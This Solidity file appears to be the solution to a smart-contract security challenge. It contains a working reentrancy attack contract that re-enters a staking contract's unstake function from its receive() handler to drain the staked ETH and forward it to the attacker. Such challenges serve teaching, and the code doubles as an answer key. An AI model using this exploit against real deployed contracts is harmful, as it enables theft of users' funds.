//SPDX-License-Identifier: MIT

//Good practice - Identify an exact version your contracts are to avoid different compiler version bugs :) No using ^
pragma solidity 0.8.15;

import "../Challenge-1/stake.sol";

//If you want to test this contract you can do so by changing the contract name to Attack1
//If you have a contract with the name Attack1 already make sure to comment your attack contract out
//You cnan mass comment out a section by highlighting multiple lines & pressing ctrl + / 
contract Attack1Solved {

    //Declare an instance of the staking interface
    IStake staking;

    //The address of the attacker
    address attacker;

    constructor(address stakingAddress) {

        //Build an instance of the staking interface
        staking = IStake(stakingAddress);

        //Store the attack address
        attacker = msg.sender;
    }

    //This function is called by the test
    function attack() external payable{

        //Store the balance in memory
        uint256 bal = msg.value;

        //Check that the value sent is greater than or equal to 1 ETH
        require(msg.value >= 1 * 10**18, "ERR:WV");//WV => Wrong Value

        //Stake 1 eth
        staking.stake{value: 1 * 10**18}();

        //Unstake
        staking.unstake();
    }

    //When we call the unstake function the unstake function sends us ETH before setting out balance to zero so we can re-enter
    //This function is called upon this contract receiving ETH
    receive() external payable {

        //If the balance of the staking contract is greater than or equal to 1 ETH
        if(address(staking).balance >= 1 ether){

            //call the unstake function again 
            //We can call this function because our balance hasn't yet been set to zero
            staking.unstake();
        } else {

            //If there is no more ETH to steal send the funds to the attacker 
            (bool success, ) = attacker.call{value: address(this).balance}("");

            //Check that the transfer of ETH went through successfully
            require(success, "ERR:OT");//OT => On Transfer
        }
    }
}